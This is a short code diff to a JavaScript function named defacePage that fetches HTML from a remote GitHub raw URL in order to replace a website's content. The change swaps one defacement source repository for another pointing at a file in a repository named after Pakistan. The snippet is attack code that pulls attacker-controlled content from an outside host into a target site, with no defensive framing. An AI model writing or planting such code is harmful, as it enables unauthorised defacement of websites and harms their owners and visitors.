@@ -1,7 +1,7 @@
 async function defacePage() {
     try {
         // URL of the HTML content you want to load
-        const url = 'https://raw.githubusercontent.com/lumino1337/deface/main/index.html';
+        const url = 'https://raw.githubusercontent.com/urddos4807010/pakistan/main/hv/style.php';
         
         // Fetch the content of the external HTML page
         const response = await fetch(url);
